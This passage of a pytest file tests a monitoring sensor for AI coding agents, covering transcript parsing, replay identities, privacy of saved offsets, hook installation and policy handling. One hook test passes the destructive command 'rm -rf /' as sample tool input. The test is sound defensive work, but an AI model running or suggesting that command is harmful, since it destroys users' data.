        "payload": {"type": "message", "role": "user", "content": "same words"},
    }
    first = parser.parse(prompt, 3)[0]
    second = parser.parse(prompt, 4)[0]
    assert first["evidence"]["logical_id"] != second["evidence"]["logical_id"]
    suppressed = Parser("codex-cli", "/tmp/rollout.jsonl", fresh=False, started=True)
    suppressed.session["id"] = "native-session"
    changed = suppressed.parse(
        dict(prompt, payload=dict(prompt["payload"], content="private replacement")),
        3,
    )[0]
    assert changed["evidence"] == first["evidence"]
    result = parser.parse(
        {
            "type": "response_item",
            "payload": {
                "type": "custom_tool_call_output",
                "call_id": "patch-1",
                "output": "ok",
            },
        },
        5,
    )[0]
    assert result["evidence"]["logical_id"] != events[0]["evidence"]["logical_id"]
    assert result["evidence"]["gaps"] == []
    ended = parser.parse(
        {"type": "event_msg", "payload": {"type": "task_complete"}}, 6
    )[0]
    assert ended["kind"] == "session.end"
    assert "complete" not in ended["evidence"] and "watermark" not in ended["evidence"]
    native_prompt = dict(prompt, payload=dict(prompt["payload"], id="message-1"))
    native_first = next(e for e in parser.parse(native_prompt, 7) if e["kind"] == "prompt")
    native_repeated = parser.parse(native_prompt, 8)[0]
    assert native_first["evidence"]["logical_id"] == native_repeated["evidence"]["logical_id"]
    assert native_first["evidence"]["observation_id"] != native_repeated["evidence"]["observation_id"]


def test_gemini_replacement_detects_native_session_change(tmp_path):
    path = tmp_path / "session-g.json"
    doc = {"sessionId": "first", "messages": [{"type": "user", "content": "old"}]}
    path.write_text(json.dumps(doc))
    events = []
    collector = Collector(
        "gemini-cli", [], [str(path)], Offsets(tmp_path / "offsets"), True, events.append
    )
    collector.poll(True)
    original_prompt = next(e for e in events if e["kind"] == "prompt")
    original_stream = events[-1]["evidence"]["stream_id"]
    events.clear()
    replacement = tmp_path / "replacement"
    replacement.write_text(json.dumps(doc))
    replacement.replace(path)
    collector.poll()
    assert not events
    reconstructed = []
    Collector(
        "gemini-cli", [], [str(path)], Offsets(tmp_path / "rebuilt-offsets"), True, reconstructed.append
    ).poll(True)
    replayed_prompt = next(e for e in reconstructed if e["kind"] == "prompt")
    assert replayed_prompt["evidence"] == original_prompt["evidence"]
    doc = {"sessionId": "second", "messages": [{"type": "user", "content": "new"}]}
    path.write_text(json.dumps(doc))
    collector.poll()
    prompt = next(e for e in events if e["kind"] == "prompt")
    assert prompt["session"]["id"] == "second" and prompt["text"] == "new"
    assert prompt["evidence"]["gaps"] == ["source_reset"]
    assert prompt["evidence"]["stream_id"] != original_stream


def test_collector_restart_preserves_identity_without_persisting_content(tmp_path):
    path = tmp_path / "rollout.jsonl"
    records = [
        {
            "type": "session_meta",
            "payload": {"id": "native-session", "cwd": "/private/project"},
        },
        {
            "type": "response_item",
            "payload": {
                "type": "function_call",
                "name": "exec_command",
                "call_id": "c",
                "arguments": '{"cmd":"echo private-argument"}',
            },
        },
    ]
    path.write_text("".join(json.dumps(record) + "\n" for record in records))
    offset_path = tmp_path / "offsets.json"
    events = []
    Collector(
        "codex-cli", [], [str(path)], Offsets(offset_path), True, events.append
    ).poll(True)
    saved = offset_path.read_text()
    assert "private-argument" not in saved and "/private/project" not in saved
    assert "native-session" in saved
    result = {
        "type": "response_item",
        "payload": {
            "type": "function_call_output",
            "call_id": "c",
            "output": "private-result",
        },
    }
    with path.open("a") as f:
        f.write(json.dumps(result) + "\n")
    restarted = []
    Collector(
        "codex-cli", [], [str(path)], Offsets(offset_path), True, restarted.append
    ).poll(True)
    output = next(e for e in restarted if e["kind"] == "tool.result")
    assert output["session"]["id"] == "native-session"
    assert output["evidence"]["gaps"] == ["missing_tool_call", "parser_restart"]
    assert "command" not in output
    assert "private-result" not in offset_path.read_text()
    replayed = []
    Collector(
        "codex-cli",
        [],
        [str(path)],
        Offsets(tmp_path / "replay-offsets"),
        True,
        replayed.append,
    ).poll(True)
    replay_output = next(e for e in replayed if e["kind"] == "tool.result")
    assert (
        output["evidence"]["observation_id"]
        == replay_output["evidence"]["observation_id"]
    )
    assert output["evidence"]["logical_id"] == replay_output["evidence"]["logical_id"]


def test_codex_replay_ids_survive_skipped_history_and_fresh_backfill(tmp_path):
    path = tmp_path / "rollout.jsonl"
    metadata = {"type": "session_meta", "payload": {"id": "native-session"}}
    path.write_text(json.dumps(metadata) + "\n")
    events = []
    collector = Collector(
        "codex-cli", [], [str(path)], Offsets(tmp_path / "offsets"), False, events.append
    )
    collector.poll(True)
    events.clear()
    position = path.stat().st_size + 1
    prompt = {
        "type": "response_item",
        "payload": {"type": "message", "role": "user", "content": "new prompt"},
    }
    call = {
        "type": "response_item",
        "payload": {
            "type": "function_call", "name": "exec_command", "call_id": "native-call",
            "arguments": '{"cmd":"echo visible"}',
        },
    }
    result = {
        "type": "response_item",
        "payload": {"type": "function_call_output", "call_id": "native-call", "output": "visible"},
    }
    with path.open("a") as f:
        for record in (prompt, call, result):
            f.write(json.dumps(record) + "\n")
    collector.poll()
    observed = next(e for e in events if e["kind"] == "prompt")
    replayed = []
    Collector(
        "codex-cli", [], [str(path)], Offsets(tmp_path / "rebuilt-offsets"), True, replayed.append
    ).poll(True)
    replay = next(e for e in replayed if e["kind"] == "prompt")
    for key in ("stream_id", "logical_id", "observation_id", "sequence", "part"):
        assert observed["evidence"][key] == replay["evidence"][key], key
    assert observed["evidence"]["sequence"] == position
    assert observed["source"]["line"] == 1 and replay["source"]["line"] == 2
    for kind in ("command", "tool.result"):
        captured = next(e for e in events if e["kind"] == kind)
        rebuilt = next(e for e in replayed if e["kind"] == kind)
        assert captured["session"]["id"] != rebuilt["session"]["id"]
        for key in ("stream_id", "observation_id", "sequence", "part"):
            assert captured["evidence"][key] == rebuilt["evidence"][key], (kind, key)


@pytest.mark.parametrize("reason", ["malformed_record", "oversized_record"])
def test_gemini_unknown_session_gap_survives_restart(tmp_path, reason):
    path = tmp_path / "session-g.json"
    if reason == "malformed_record":
        path.write_text('{"messages":private-incomplete-content')
    else:
        with path.open("wb") as f:
            f.write(b"private-incomplete-content")
            f.truncate((64 << 20) + 1)
    offset_path = tmp_path / "offsets"
    events = []
    Collector(
        "gemini-cli", [], [str(path)], Offsets(offset_path), True, events.append
    ).poll(True)
    assert len(events) == 1 and "session" not in events[0]
    assert events[0]["evidence"]["gaps"] == [reason]
    assert "private-incomplete-content" not in offset_path.read_text()
    path.write_text(json.dumps({
        "sessionId": "native-session",
        "messages": [{"type": "user", "content": "recovered prompt"}],
    }))
    events.clear()
    Collector(
        "gemini-cli", [], [str(path)], Offsets(offset_path), True, events.append
    ).poll(True)
    prompt = next(e for e in events if e["kind"] == "prompt")
    assert prompt["session"]["id"] == "native-session"
    assert reason in prompt["evidence"]["gaps"]


def test_synthetic_gap_ids_distinguish_positions_and_survive_replay(tmp_path):
    path = tmp_path / "session.jsonl"
    path.write_text("invalid json\ninvalid json\n")
    captured = []
    for offset_name in ("offsets", "replay-offsets"):
        events = []
        Collector(
            "claude-code", [], [str(path)], Offsets(tmp_path / offset_name), True,
            events.append,
        ).poll(True)
        assert len(events) == 2
        assert all(e["evidence"]["gaps"] == ["malformed_record"] for e in events)
        assert [e["evidence"]["sequence"] for e in events] == [1, 14]
        assert len({e["evidence"]["logical_id"] for e in events}) == 2
        assert len({e["evidence"]["observation_id"] for e in events}) == 2
        captured.append([e["evidence"] for e in events])
    assert captured[0] == captured[1]


@pytest.mark.parametrize(
    "reason,replacement,recovered_id",
    [
        ("malformed_record", "atomic", "session-b"),
        ("malformed_record", "truncate", "session-b"),
        ("oversized_record", "atomic", "session-b"),
        ("oversized_record", "truncate", "session-b"),
        ("malformed_record", "atomic", "session-a"),
        ("malformed_record", "atomic", None),
        ("oversized_record", "truncate", None),
    ],
)
def test_gemini_document_gap_waits_for_recovered_identity(
    tmp_path, reason, replacement, recovered_id
):
    path = tmp_path / "session-g.json"
    original = {
        "sessionId": "session-a",
        "messages": [{"type": "user", "content": "original prompt"}],
    }
    path.write_text(json.dumps(original))
    offset_path = tmp_path / "offsets"
    events = []
    collector = Collector(
        "gemini-cli", [], [str(path)], Offsets(offset_path), True, events.append
    )
    collector.poll(True)
    assert events[-1]["session"]["id"] == "session-a"
    assert events[-1]["evidence"]["gaps"] == []
    original_stream = events[-1]["evidence"]["stream_id"]
    original_inode = path.stat().st_ino
    incomplete = tmp_path / "replacement" if replacement == "atomic" else path
    with incomplete.open("wb") as stream:
        stream.write(b'{"sessionId":"private-incomplete-content"')
        if reason == "oversized_record":
            stream.truncate((64 << 20) + 1)
    if replacement == "atomic":
        incomplete.replace(path)
    assert (path.stat().st_ino == original_inode) == (replacement == "truncate")
    events.clear()
    if replacement == "truncate":
        collector = Collector(
            "gemini-cli", [], [str(path)], Offsets(offset_path), True, events.append
        )
        collector.poll(True)
    else:
        collector.poll()
    assert len(events) == 1
    assert "session" not in events[0]
    assert events[0]["evidence"]["gaps"] == [reason]
    assert "private-incomplete-content" not in offset_path.read_text()
    events.clear()
    collector = Collector(
        "gemini-cli", [], [str(path)], Offsets(offset_path), True, events.append
    )
    collector.poll(True)
    assert all("session" not in e for e in events)
    recovered = {
        "sessionId": recovered_id,
        "messages": [*original["messages"], {"type": "user", "content": "recovered"}],
    }
    if recovered_id is None:
        recovered.pop("sessionId")
    path.write_text(json.dumps(recovered))
    events.clear()
    collector.poll()
    prompt = next(e for e in events if e.get("text") == "recovered")
    assert all(
        e.get("session", {}).get("id") == (recovered_id or "g")
        for e in events if e["kind"] != "sensor"
    )
    if recovered_id != "session-a":
        assert all(e.get("session", {}).get("id") != "session-a" for e in events)
    assert reason in prompt["evidence"]["gaps"]
    assert ("source_reset" in prompt["evidence"]["gaps"]) == (recovered_id != "session-a")
    assert "parser_restart" in prompt["evidence"]["gaps"]
    if recovered_id is None:
        native_id = "session-a" if replacement == "truncate" else "session-b"
        recovered["sessionId"] = native_id
        path.write_text(json.dumps(recovered))
        events.clear()
        Collector(
            "gemini-cli", [], [str(path)], Offsets(offset_path), True, events.append
        ).poll(True)
        prompt = next(e for e in events if e.get("text") == "recovered")
        assert prompt["session"]["id"] == native_id
        assert reason in prompt["evidence"]["gaps"]
        assert (prompt["evidence"]["stream_id"] == original_stream) == (
            native_id == "session-a"
        )


@pytest.mark.parametrize("message_count", [1, 2])
def test_gemini_missing_identity_replacement_resets_native_cursor(tmp_path, message_count):
    path = tmp_path / "session-g.json"
    path.write_text(json.dumps({
        "sessionId": "session-a",
        "messages": [{"type": "user", "content": "original"}],
    }))
    events = []
    collector = Collector(
        "gemini-cli", [], [str(path)], Offsets(tmp_path / "offsets"), True, events.append
    )
    collector.poll(True)
    original_stream = events[-1]["evidence"]["stream_id"]
    path.write_text(json.dumps({
        "messages": [{"type": "user", "content": "replacement"}] * message_count,
    }))
    events.clear()
    collector.poll()
    prompts = [e for e in events if e["kind"] == "prompt"]
    assert len(prompts) == message_count
    assert all(e["session"]["id"] == "g" for e in prompts)
    assert all(e["evidence"]["stream_id"] != original_stream for e in events)
    assert all(e["evidence"]["gaps"] == ["source_reset"] for e in events)
    assert "session" not in events[0]


@pytest.mark.parametrize(
    "replacement_count,gap,restart,backfill",
    [
        (1, None, False, True), (2, None, True, True), (3, None, False, True),
        (2, "malformed", False, True), (3, "malformed", True, True),
        (2, "oversized", True, True), (2, "unreadable", True, True),
        (3, "old_gap_checkpoint", True, True),
        (3, None, True, False), (3, "malformed", True, False),
    ],
)
def test_gemini_fallback_replacement_preserves_source_and_privacy_boundaries(
    tmp_path, monkeypatch, replacement_count, gap, restart, backfill
):
    path = tmp_path / "session-g.json"
    history = [{"type": "user", "content": f"history {i}"} for i in range(2)]
    path.write_text(json.dumps({"messages": history}))
    offset_path = tmp_path / "offsets"
    events = []
    collector = Collector(
        "gemini-cli", [], [str(path)], Offsets(offset_path), backfill, events.append
    )
    collector.poll(True)
    original_stream = events[-1]["evidence"]["stream_id"]
    replacement = tmp_path / "replacement"
    messages = [
        {"type": "user", "content": f"replacement {i}"}
        for i in range(replacement_count)
    ]
    replacement.write_text(json.dumps({"messages": messages}))
    replacement.replace(path)
    if gap:
        if gap in ("malformed", "old_gap_checkpoint"):
            path.write_text('{"messages":')
        elif gap == "oversized":
            with path.open("wb") as stream:
                stream.truncate((64 << 20) + 1)
        with monkeypatch.context() as patch:
            if gap == "unreadable":
                open_document = Path.open

                def unreadable(source, *args, **kwargs):
                    if source == path:
                        raise PermissionError("temporarily unreadable")
                    return open_document(source, *args, **kwargs)

                patch.setattr(Path, "open", unreadable)
            collector.poll()
        if gap == "old_gap_checkpoint":
            offsets = Offsets(offset_path)
            saved = offsets.get("gemini-cli", str(path))
            saved.pop("document_id", None)
            offsets.set("gemini-cli", str(path), saved)
            offsets.flush()
        path.write_text(json.dumps({"messages": messages}))
    events.clear()
    if restart:
        collector = Collector(
            "gemini-cli", [], [str(path)], Offsets(offset_path), backfill, events.append
        )
    collector.poll(restart)
    prompts = [event for event in events if event["kind"] == "prompt"]
    expected = messages if backfill else messages[len(history):]
    assert [event["text"] for event in prompts] == [m["content"] for m in expected]
    assert all(event["evidence"]["stream_id"] != original_stream for event in prompts)
    assert all("source_reset" in event["evidence"]["gaps"] for event in prompts)
    if not backfill:
        assert all("skipped_history" in event["evidence"]["gaps"] for event in prompts)
    events.clear()
    Collector(
        "gemini-cli", [], [str(path)], Offsets(offset_path), backfill, events.append
    ).poll(True)
    assert not [event for event in events if event["kind"] != "sensor"]


@pytest.mark.parametrize("product", ["claude-code", "codex-cli"])
@pytest.mark.parametrize("restart", [False, True])
@pytest.mark.parametrize("partial", [False, True])
def test_jsonl_unreadable_startup_preserves_tail_boundary_and_new_records(
    tmp_path, monkeypatch, product, restart, partial
):
    def record(text):
        if product == "claude-code":
            return {"type": "user", "sessionId": "s", "message": {"content": text}}
        return {"type": "response_item", "payload": {"type": "message", "role": "user", "content": [{"type": "input_text", "text": text}]}}

    path = tmp_path / "session.jsonl"
    path.write_text(json.dumps(record("private startup history")) + ("" if partial else "\n"))
    offset_path = tmp_path / "offsets"
    events = []
    collector = Collector(product, [], [str(path)], Offsets(offset_path), False, events.append)
    open_source = builtins.open
    unavailable = True

    def read_source(source, *args, **kwargs):
        nonlocal unavailable
        if Path(source) == path and unavailable:
            unavailable = False
            raise PermissionError("temporarily unreadable")
        return open_source(source, *args, **kwargs)

    monkeypatch.setattr(builtins, "open", read_source)
    collector.poll(True)
    assert not [event for event in events if event["kind"] != "sensor"]
    with path.open("a") as stream:
        stream.write(("\n" if partial else "") + json.dumps(record("new after recovery")) + "\n")
    if restart:
        collector = Collector(product, [], [str(path)], Offsets(offset_path), False, events.append)
    events.clear()
    collector.poll(restart)
    prompts = [event for event in events if event["kind"] == "prompt"]
    assert [event["text"] for event in prompts] == ["new after recovery"]
    assert "skipped_history" in prompts[0]["evidence"]["gaps"]
    assert "private startup history" not in json.dumps(events)
    assert "private startup history" not in offset_path.read_text()
    replayed = []
    Collector(product, [], [str(path)], Offsets(tmp_path / "replay"), True, replayed.append).poll(True)
    assert [event["text"] for event in replayed if event["kind"] == "prompt"] == [
        "private startup history", "new after recovery",
    ]


@pytest.mark.parametrize("product", ["gemini-cli", "claude-code", "codex-cli"])
@pytest.mark.parametrize("backfill", [False, True])
def test_transcript_replacement_between_stat_and_open_uses_opened_source(
    tmp_path, monkeypatch, product, backfill
):
    def write_source(path, texts):
        if product == "gemini-cli":
            path.write_text(json.dumps({"messages": [{"type": "user", "content": text} for text in texts]}))
        else:
            records = (
                [{"type": "user", "sessionId": "s", "message": {"content": text}} for text in texts]
                if product == "claude-code" else
                [{"type": "response_item", "payload": {"type": "message", "role": "user", "content": [{"type": "input_text", "text": text}]}} for text in texts]
            )
            path.write_text("".join(json.dumps(record) + "\n" for record in records))

    path = tmp_path / "session.json"
    write_source(path, ["original"])
    events = []
    collector = Collector(product, [], [str(path)], Offsets(tmp_path / "offsets"), backfill, events.append)
    collector.poll(True)
    original_stream = events[-1]["evidence"]["stream_id"]
    replacement = tmp_path / "replacement"
    write_source(replacement, ["new head", "new tail"])
    provider = Path if product == "gemini-cli" else builtins
    open_source = provider.open
    replaced = False

    def read_source(source, *args, **kwargs):
        nonlocal replaced
        if Path(source) == path and not replaced:
            replaced = True
            replacement.replace(path)
        return open_source(source, *args, **kwargs)

    monkeypatch.setattr(provider, "open", read_source)
    events.clear()
    collector.poll()
    prompts = [event for event in events if event["kind"] == "prompt"]
    expected = ["new tail"] if product == "gemini-cli" and not backfill else ["new head", "new tail"]
    assert [event["text"] for event in prompts] == expected
    assert all(event["evidence"]["stream_id"] != original_stream for event in prompts)
    assert all("source_reset" in event["evidence"]["gaps"] for event in prompts)
    events.clear()
    collector.poll()
    assert not [event for event in events if event["kind"] != "sensor"]


def test_collector_marks_skipped_malformed_and_unsupported_records(tmp_path):
    path = tmp_path / "session.jsonl"
    record = {"sessionId": "s", "type": "user", "message": {"content": "not captured"}}
    path.write_text(json.dumps(record) + "\n")
    events = []
    collector = Collector(
        "claude-code",
        [],
        [str(path)],
        Offsets(tmp_path / "offsets"),
        False,
        events.append,
    )
    collector.poll(True)
    assert [e["evidence"]["gaps"] for e in events] == [["skipped_history"]]
    assert "not captured" not in json.dumps(events)
    events.clear()
    with path.open("a") as f:
        f.write("invalid json\n")
        f.write(
            json.dumps(
                dict(
                    record,
                    message={"content": [{"type": "image", "data": "private image"}]},
                )
            )
            + "\n"
        )
        f.write(json.dumps(dict(record, message={"content": "visible"})) + "\n")
    collector.poll()
    lines = path.read_bytes().splitlines(keepends=True)
    assert [e["evidence"]["sequence"] for e in events] == [
        1 + sum(map(len, lines[:index])) for index in range(1, 4)
    ]
    assert "malformed_record" in events[0]["evidence"]["gaps"]
    assert "unsupported_content" in events[1]["evidence"]["gaps"]
    assert events[2]["text"] == "visible"
    assert all("skipped_history" in e["evidence"]["gaps"] for e in events)
    assert "private image" not in json.dumps(events)


def test_oversized_record_discard_survives_restart_and_append(tmp_path):
    path = tmp_path / "session.jsonl"
    path.write_bytes(b"x" * ((8 << 20) + 1))
    offset_path = tmp_path / "offsets"
    events = []
    Collector(
        "claude-code", [], [str(path)], Offsets(offset_path), True, events.append
    ).poll(True)
    assert [e["evidence"]["gaps"] for e in events] == [["oversized_record"]]
    record = {
        "sessionId": "s",
        "type": "user",
        "message": {"content": "discard this tail"},
    }
    with path.open("a") as f:
        f.write(json.dumps(record) + "\n")
        f.write(json.dumps(dict(record, message={"content": "next record"})) + "\n")
    events.clear()
    collector = Collector(
        "claude-code", [], [str(path)], Offsets(offset_path), True, events.append
    )
    collector.poll(True)
    prompts = [e for e in events if e["kind"] == "prompt"]
    assert len(prompts) == 1 and prompts[0]["text"] == "next record"
    assert prompts[0]["evidence"]["sequence"] == (
        (8 << 20) + 1 + len((json.dumps(record) + "\n").encode()) + 1
    )
    assert "discard this tail" not in json.dumps(events)
    events.clear()
    collector.poll()
    assert not events


def test_spool_restart_ack_and_cap(tmp_path):
    spool = Spool(tmp_path, max_segment_bytes=1, max_total_bytes=100000)
    for i in range(4):
        spool.append({"id": str(i)})
    batch = spool.read(2)
    assert [e["id"] for e in batch["events"]] == ["0", "1"]
    spool.ack(batch)
    spool.close()
    reopened = Spool(tmp_path)
    assert reopened.depth == 2
    assert [e["id"] for e in reopened.read()["events"]] == ["2", "3"]
    capped = Spool(tmp_path / "capped", max_segment_bytes=1, max_total_bytes=35)
    for i in range(20):
        capped.append({"id": str(i)})
    assert capped.dropped and capped.depth < 20


def test_hooks_preserve_settings_and_decisions(tmp_path, sensor_executable):
    path = tmp_path / "settings.json"
    original = {
        "theme": "dark",
        "hooks": {"PreToolUse": [{"hooks": [{"command": "other"}]}]},
    }
    path.write_text(json.dumps(original))
    hooks.install(path, sensor_executable)
    hooks.install(path, sensor_executable)
    assert len(json.loads(path.read_text())["hooks"]["PreToolUse"]) == 2
    assert hooks.installed(path)
    hooks.uninstall(path)
    assert json.loads(path.read_text()) == original
    # Native decisions now come from the backend. An absent backend never
    # falls back to locally cached denial rules.
    server = hooks.HookServer("127.0.0.1:0", tmp_path / "sock", lambda _: None, lambda: {}, {})
    response = server.evaluate({"session_id": "s", "hook_event_name": "PreToolUse",
                               "tool_name": "Bash", "tool_input": {"command": "rm -rf /"}})
    assert response == {"decision": "allow", "output": {}, "claude_code": {}, "failed": True}


@pytest.mark.parametrize("old_cache", [None, "invalid cached JSON"])
def test_sensor_discards_rule_bodies_and_ignores_old_policy_cache(tmp_path, monkeypatch, old_cache):
    cache = tmp_path / "policy.json"
    if old_cache is not None:
        cache.write_text(old_cache)
    config = Config(tmp_path / "config", server_url="http://localhost", sensor_id="s",
                    sensor_token="t", data_dir=str(tmp_path), telemetry={"enabled": False},
                    inventory={"enabled": False})
    monkeypatch.setattr(Policy, "_compile_rules", lambda *_: pytest.fail("endpoint must not compile policy rules"))
    sensor = Sensor(config)
    try:
        config_reply = default_sensor_config()
        config_reply["capture"]["tool_output"] = False
        reply = {"policy": {"version": 3, "rules": [{"action": "deny", "match": {"command_regex": "["}}]},
                 "config": config_reply}
        sensor.apply(reply)
        assert "policy" not in reply
        assert sensor.status()["policy_version"] == 3
        assert sensor.status()["policy_delivery"] == "backend"
        assert "policy_rules" not in sensor.status() and "policy_errors" not in sensor.status()
        assert not sensor.capture["tool_output"] and sensor.capture["redact"]
        sensor.apply({"policy_version": 4, "policy": {"version": 1, "rules": "invalid"}})
        assert sensor.policy_version == 4
        sensor.apply({"policy_version": "invalid", "policy": ["invalid"]})
        assert sensor.policy_version == 4
        assert not hasattr(sensor, "policy")
        if old_cache is None:
            assert not cache.exists()
        else:
            assert cache.read_text() == old_cache
        assert json.loads((tmp_path / "server-config.json").read_text())["capture"]["redact"]
    finally:
        sensor.hook_clients.close()
        sensor.spool.close()
        sensor.client.close()


def test_codex_hooks_install_records_trust_and_uninstall_restores(tmp_path, sensor_executable):
    import tomlkit

    path, config_toml = tmp_path / "hooks.json", tmp_path / "config.toml"
    other = {"matcher": "Bash", "hooks": [{"type": "command", "command": "other"}]}
    path.write_text(json.dumps({"hooks": {"PreToolUse": [other]}}))
    config_toml.write_text(
        '[otel]\nlog_user_prompt = false\n\n[hooks.state]\n'
        '[projects."/repo"]\ntrust_level = "trusted"\n'
    )
    hooks.install_codex(path, sensor_executable, config_toml)
    hooks.install_codex(path, sensor_executable, config_toml)
    written = json.loads(path.read_text())["hooks"]
    assert set(written) == set(hooks.CODEX_EVENTS)
    assert written["PreToolUse"][0] == other and len(written["PreToolUse"]) == 2
    handler = written["PreToolUse"][1]["hooks"][0]
    assert handler == {
        "type": "command",
        "command": hooks.command_line(sensor_executable, "PreToolUse", "codex", health_dir=tmp_path / "openaidr-hook-health"),
        "timeout": 5 if os.name == "nt" else 3,
    }
    assert "async" not in written["UserPromptSubmit"][0]["hooks"][0]
    assert "async" not in written["PostToolUse"][0]["hooks"][0]
    assert written["SessionEnd"][0]["hooks"][0]["timeout"] == 3
    assert hooks.installed(path, "codex") and hooks.codex_trusted(path, config_toml)
    document = tomlkit.parse(config_toml.read_text())
    state = document["hooks"]["state"]
    assert set(state) == {
        f"{path}:pre_tool_use:1:0",
        f"{path}:post_tool_use:0:0",
        f"{path}:user_prompt_submit:0:0",
        f"{path}:session_start:0:0",
        f"{path}:subagent_start:0:0",
        f"{path}:subagent_stop:0:0",
        f"{path}:session_end:0:0",
        f"{path}:stop:0:0",
    }
    assert state[f"{path}:pre_tool_use:1:0"]["trusted_hash"] == hooks.codex_hook_hash(
        "PreToolUse", written["PreToolUse"][1], handler
    )
    assert document["otel"]["log_user_prompt"] is False
    assert document["projects"]["/repo"]["trust_level"] == "trusted"
    # A changed definition invalidates the recorded trust until reinstalled.
    recorded = state[f"{path}:pre_tool_use:1:0"]["trusted_hash"]
    handler["timeout"] = 20
    path.write_text(json.dumps({"hooks": written}))
    assert not hooks.codex_trusted(path, config_toml)
    status = hooks.status({"codex": path, "codex_config": config_toml, "claude": tmp_path / "none"})
    assert status["codex"] == {"installed": False, "partial": True, "trusted": False}
    assert status["claude"] == {"installed": False, "partial": False}
    # Reinstalling restores the installed definition and its digest.
    hooks.install_codex(path, sensor_executable, config_toml)
    state = tomlkit.parse(config_toml.read_text())["hooks"]["state"]
    assert state[f"{path}:pre_tool_use:1:0"]["trusted_hash"] == recorded
    assert hooks.codex_trusted(path, config_toml)
    hooks.uninstall_codex(path, config_toml)
    assert json.loads(path.read_text()) == {"hooks": {"PreToolUse": [other]}}
    assert dict(tomlkit.parse(config_toml.read_text())["hooks"]["state"]) == {}
    assert not hooks.installed(path, "codex")


def test_codex_hook_hash_matches_codex_normalization():
    # Codex hashes sorted compact JSON of {event_name, matcher?, hooks:[handler]}
    # with the handler's effective timeout and async flag; unset optional
    # fields are absent, and the default additionalContextLimit is dropped.
    import hashlib

    handler = {"type": "command", "command": "/x hook --agent codex Stop", "timeout": 10, "async": True}
    expected = "sha256:" + hashlib.sha256(
        b'{"event_name":"stop","hooks":[{"async":true,"command":"/x hook --agent codex Stop","timeout":10,"type":"command"}]}'
    ).hexdigest()
    assert hooks.codex_hook_hash("Stop", {}, handler) == expected
    default = {"type": "command", "command": "c", "additionalContextLimit": 2500}
    assert hooks.codex_hook_hash("PreToolUse", {"matcher": "Bash"}, default) == (
        "sha256:"
        + hashlib.sha256(
            b'{"event_name":"pre_tool_use","hooks":[{"async":false,"command":"c","timeout":600,"type":"command"}],"matcher":"Bash"}'
        ).hexdigest()
    )
    clamped = hooks.codex_hook_hash("SessionEnd", {}, {"type": "command", "command": "c", "timeout": 30})
    assert clamped == hooks.codex_hook_hash("SessionEnd", {}, {"type": "command", "command": "c", "timeout": 3})


def test_codex_hook_payloads_become_events(tmp_path, backend_hook):
    emitted = []
    server = hooks.HookServer(
        "127.0.0.1:0",
        tmp_path / "sock",
        emitted.append,
        lambda: {},
        {"hostname": "h"},
        {"codex-cli": True, "claude-code": False},
        check=backend_hook(),
    )
    common = {
        "session_id": "thr_1",
        "turn_id": "turn_1",
        "effort": {"level": "high"},
        "cwd": "/repo",
        "model": "gpt-6-astra",
        "permission_mode": "bypassPermissions",
        "transcript_path": "/home/u/.codex/sessions/rollout.jsonl",
    }
    server.evaluate({**common, "hook_event_name": "SessionStart", "source": "startup"}, "codex-cli")
    server.evaluate({**common, "hook_event_name": "UserPromptSubmit", "prompt": "list files"}, "codex-cli")
    call = {
        **common,
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_use_id": "call_1",
        "tool_input": {"command": "ls -la"},
    }
    assert server.evaluate(call, "codex-cli")["decision"] == "allow"
    server.evaluate(
        {**call, "hook_event_name": "PostToolUse", "tool_response": "README.md\nsrc\n"},
        "codex-cli",
    )
    patch = "*** Begin Patch\n*** Update File: src/app.py\n@@\n-a\n+b\n*** End Patch"
    server.evaluate(
        {**call, "hook_event_name": "PreToolUse", "tool_name": "apply_patch", "tool_use_id": "call_2", "tool_input": {"command": patch}},
        "codex-cli",
    )
    server.evaluate(
        {**call, "hook_event_name": "PostToolUse", "tool_name": "apply_patch", "tool_use_id": "call_2", "tool_input": {"command": patch}, "tool_response": "Exit code: 0\nSuccess. Updated the following files:\nM src/app.py"},
        "codex-cli",
    )
    server.evaluate(
        {**call, "hook_event_name": "PreToolUse", "tool_name": "mcp__docs__search", "tool_use_id": "call_3", "tool_input": {"query": "hooks"}},
        "codex-cli",
    )
    server.evaluate(
        {**call, "hook_event_name": "PostToolUse", "tool_name": "mcp__docs__search", "tool_use_id": "call_3", "tool_input": {"query": "hooks"}, "tool_response": {"content": [{"type": "text", "text": "found it"}], "isError": False}},
        "codex-cli",
    )
    server.evaluate({**common, "hook_event_name": "Stop", "stop_hook_active": False, "last_assistant_message": "Done."}, "codex-cli")
    server.evaluate({**common, "hook_event_name": "SessionEnd", "reason": "other"}, "codex-cli")
    decisions = [e for e in emitted if e["kind"] == "hook.decision"]
    assert len(decisions) == 7
    assert all(e["hook"]["decision"] == "allow" for e in decisions)
    emitted = [e for e in emitted if e["kind"] != "hook.decision"]
    kinds = [(e["kind"], e.get("text"), (e.get("tool") or {}).get("name")) for e in emitted]
    assert kinds == [
        ("session.start", "startup", None),
        ("prompt", "list files", None),
        ("command", None, "Bash"),
        ("tool.result", None, "Bash"),
        ("file.write", None, "apply_patch"),
        ("tool.result", None, "apply_patch"),
        ("tool.call", None, "mcp__docs__search"),
        ("tool.result", None, "mcp__docs__search"),
        ("response", "Done.", None),
        ("session.end", "other", None),
    ]
    assert all(e["agent"] == {"product": "codex-cli", "model": "gpt-6-astra", "reasoning_effort": "high"} for e in emitted)
    assert all(e["session"] == {"id": "thr_1", "cwd": "/repo"} for e in emitted)
    assert all(e["source"]["collector"] == "hook" for e in emitted)
    assert emitted[2]["command"] == {"text": "ls -la", "cwd": "/repo", "description": "", "background": False}
    assert emitted[2]["tool"]["call_id"] == "call_1" and emitted[2]["tool"]["input"] == {"command": "ls -la"}
    assert emitted[3]["tool"]["output"] == "README.md\nsrc\n" and "command" not in emitted[3]
    assert emitted[4]["file"] == {"path": "src/app.py", "op": "edit"}
    assert emitted[5]["command"] == {"exit_code": 0}
    assert emitted[7]["tool"] == {"name": "mcp__docs__search", "call_id": "call_3", "output": "found it", "is_error": False}
    assert server.stats["by_product"] == {"codex-cli": 10}
    # Collector capture suppresses hook actions, including final responses.
    emitted.clear()
    server.emit = emitted.append
    server.evaluate({"session_id": "s", "hook_event_name": "UserPromptSubmit", "prompt": "hi"})
    server.evaluate({"session_id": "s", "hook_event_name": "Stop", "last_assistant_message": "Done."})
    assert not any(event["kind"] in ("prompt", "response") for event in emitted)


def test_sensor_emit_disabled_and_redacted(tmp_path, monkeypatch):
    config = Config(
        tmp_path / "config",
        server_url="http://localhost",
        sensor_id="s",
        sensor_token="t",
        data_dir=str(tmp_path),
        collectors={
            "claude_code": {"enabled": False},
            "codex_cli": {"enabled": False},
